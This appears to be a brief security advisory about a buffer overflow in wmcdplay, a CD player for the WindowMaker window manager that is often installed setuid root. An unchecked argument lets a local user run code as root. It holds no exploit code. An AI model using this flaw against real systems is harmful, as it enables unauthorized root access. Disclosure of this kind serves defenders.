wmcdplay is cdplayer generally used with the WindowMaker X11 window-manager on unix systems. While wmcdplay is rarely installed at all by default, when it is installed it is typically set setuid root. wmcdplay is vulnerable to a buffer overflow attack due to lack of bounds checking on an argument it is passed. As a result, a local user can elevate their priviliges to root through overruning the stack and executing arbitrary code with the effective user-id of the process (root).
